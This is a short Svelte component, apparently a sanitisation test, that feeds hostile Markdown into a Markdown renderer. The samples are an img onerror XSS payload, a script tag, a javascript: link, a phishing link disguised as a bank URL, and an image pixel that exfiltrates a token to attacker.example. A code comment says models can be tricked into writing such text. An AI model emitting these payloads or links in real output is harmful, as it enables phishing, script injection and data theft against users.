<script>
  import { Markdown } from "carbon-components-svelte";

  // Text a model could be tricked into writing: none of it reaches the page
  // as markup, and none of the links go anywhere unsafe.
  const source = `<img src=x onerror="alert('img')">

<script>alert("script")${"</"}script>

[Click to verify your account](javascript:alert('link'))

[https://bank.example.com](https://login.attacker.example/)

![](https://attacker.example/pixel.gif?token=secret)

[A real link](https://example.com/docs)`;
</script>

<Markdown {source} />
